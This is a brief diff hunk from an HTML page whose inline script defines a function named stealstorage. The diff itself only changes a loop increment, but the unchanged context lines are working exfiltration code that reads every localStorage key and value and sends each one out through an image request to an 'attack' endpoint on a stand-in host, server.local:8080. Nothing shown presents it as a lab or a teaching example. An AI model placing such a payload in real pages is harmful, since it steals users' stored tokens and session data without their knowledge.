@@ -15,7 +15,7 @@
 <script>
     function stealstorage() {
         let i = 0, len = localStorage.length;
-        for (; i < len; ++i) {
+        for (; i < len; i++) {
             console.log(localStorage.key(i));
             let img = document.createElement("IMG");
             img.src = "http://server.local:8080/attack?data=" + encodeURI(localStorage.key(i) + ":" + localStorage.getItem(localStorage.key(i)));
